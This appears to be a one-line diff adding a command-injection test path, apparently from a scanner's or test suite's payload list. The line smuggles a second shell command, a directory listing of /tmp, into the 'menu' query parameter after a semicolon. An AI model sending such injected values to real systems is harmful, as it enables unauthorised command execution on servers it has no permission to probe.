@@ -1,0 +1,1 @@
+/0-cmdinjection/listar.php?menu=documentos;ls%20/tmp/;
